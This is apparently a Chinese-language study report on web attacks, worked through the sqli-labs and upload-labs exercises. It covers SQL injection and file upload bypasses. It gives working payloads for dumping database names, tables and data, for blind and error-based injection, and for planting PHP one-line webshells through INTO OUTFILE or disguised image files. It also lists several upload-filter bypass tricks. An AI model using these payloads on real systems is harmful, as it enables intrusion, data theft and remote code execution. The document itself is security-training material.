

# 学习报告（一）

## sql注入

重点在于sql语句的拼接闭合，使语句能正确运行

$sql="SELECT * FROM users WHERE id=**'$id'**(再此注入/改变) LIMIT 0,1";

### 注入模板

用点（**.**）连接数据库之间的数据

**求闭合方式：**

数字型：构造?id=1 and 1=1 和 ?id=1 and 1=2

字符型：构造?id=1’ and ‘1’=1’ 和 ?id=1’ and ‘1’='2

**万能密码**：1'or 1=1#判断过滤类型，若源码未做任何过滤则可直接报出其下所有数据

**求列数**：order by (列数)   为了知道能回显多少数据/在哪看到数据

**求回显位（若有）**：联合注入

将**id**设为**不存在**是因为id本身的数据会**占据回显位**，这样就不能得到想要的数据

**爆库名**：union select 1,2,database（）-- +

```sql
select group_concat(schema_name) from information_schema.schemat
```

查询information_schema的schemata表，里边存放着所有mysql数据库的数据库名。

**爆表名**：union select 1,2,group_concat(table_name) from information_schema.tables where       table_schema='security'-- +

**当information_schema库被禁时**:

```sql
select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()
```

**爆列名**：union select 1,2,group_concat(column_name) from information_schema.columns where table_name='***'-- +

**爆数据**：union select 1,2,group_concat(**）from table_name -- +  爆数据时名称不用用单引号包裹

```sql
-1 union select 1,(select`4`from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)-- -
```

植入一句话木马：?id=1‘))union select 1,"<?php%20eval($_REQUEST[1])?>",3 into outfile"C:/phpstudy_pro/WWW/sqli-labs/sqli-labs-master（4)/sqli-labs-master/Less-7/shell.php" -- q

**为防止注释后空格被忽略可加任意字符**

group_concat()输出更多数据，concat（）

limit子句用于限制查询结果返回的数量

limit x，1         x=0,1,2 ......、

模糊查询：select from 表名 where username like ' %k% ' or 1=1# ;

返回了所有含有k的用户。

### 注入手法（sqli-labs）

#### 联合注入（有回显位）union select

单引号（less-1）整形（less-2）单引号变形加括号（less-3）双引号变形（less-4）

**读取或写入shell**

into dumpfile()

into outfile()

load_file()

?id=1'))union select 1,"<?php eval($_REQUEST[1])?>",3 into outfile+木马建立路径-- +一句话木马上传（less-7）

#### 盲注（无回显位）

##### 布尔盲注：基于页面返回的对错判断

求库名长度，**ascii**逐个判断字符

and(length(**database()**))=

求库名

and (ascii(substr(database(),1（位数）,1)))=数字（判断）（对应ascii）

mid（a,b,c）从b开始截取a的c位

substr（a,b,c）从b开始截取a的长度c

left（a，b）由左截取a的前b位

#### 报错盲注（有报错信息如页面明显不一样）

通过报错信息得到数据

extractvalue、floor、updatexml（xml内容，路径，更新的内容）

?id=** and updatexml(1,concat(<u>0x7e</u>,(**select database()（模板）**),<u>0x7e</u>),1) --+  划线部分负责标记所需数据

单引号（less-5）  双引号（less-6）

#### 延时盲注（无报错）：基于页面间隔的时间判断

sleep(if(condition，时间A，时间B)）   条件成立返回A，条件不成立返回B

if中内容如布尔盲注，用sleep（）显示报错信息

#### 排序盲注



## 文件上传

### 漏洞产生原因：

文件检查不严（断点工具绕过，忽略大小写，截断符）

修改文件名处理不当

第三方插件引入

### 防止上传漏洞

客户端检测（JS）抓包修改文件格式（pass-1）

服务器端检测（MIME）抓包修改content-type（pass-2）

### 一句话木马（php，asp，aspx，jsp，war，cgi）

常见形式：<?php @eval($_POST['cmd']); ?>

​                  **@的意思是不报错**

​                  **eval()把字符串作为PHP代码执行**

​				  **使用php的超级全局变量**

​                  整句话的意思就是由POST接收想执行的代码cmd=

然后以PHP代码执行

目标：成功上传

​		   明确路径

​		   正常运行

**图片一句话木马**

使用cmd将一句话木马与要替换的图片合为一个新图片

**制作图片马命令**：copy 图片文件名称/b+脚本文件名称/a  新生成的文件名称，例如：copy 222.jpg/b+111.php/a 333.jpg

### 绕过方式

特殊后缀（php5） httpd.conf文件下添加代码 （pass-3）

.htaccess 将jpg当作php执行 (pass-4)

AddType application/x-httpd-php .jpg

<FilesMatch "a"> 
Sethandler application/x-httpd-php
</Filesmatch> 

.user.ini.

大小写（无$file_ext = strtolower($file_ext);）（pass-6）

空格（无$file_ext = strtolower($file_ext);）（pass-7）

加点（无$file_name = deldot($file_name)；）（pass-8）

特殊符号::$DATA(无$file_ext = str_ireplace('::$DATA', '', $file_ext);) （pass-9）url删除符号

文件后使用**. .**（有delot()，此函数遇到空格会停）（pass-10）

双写.pphphp  str_ireplace(find,replace,string,count) 函数将文件名中存在的黑名单字符串替换为空（不区分大小写）(pass-11)

%00    move_uploaded_file遇到0x00会截断   (pass-12)

​           POST不会对里面的数据自动解码，需要在Hex中修改(pass-13)

图片马    $bin = fread($file, 2)

​             Png图片文件包括8字节：89 50 4E 47 0D 0A 1A 0A。即为 .PNG。
​             Jpg图片文件包括2字节：FF D8。
​             Gif图片文件包括6字节：47 49 46 38 39|37 61 。即为 GIF89(7)a。
​             Bmp图片文件包括2字节：42 4D。即为 BM。（pass-14）                                

​			getimagesize()  （pass-15）  

​             exif_imagetype()读取一个图像的第一个字节并检查其后缀名。开启php_exif  （pass-16）

二次渲染：后端重写文件内容

条件竞争   使用burp不停重放，并用python脚本不停访问以确定是否成功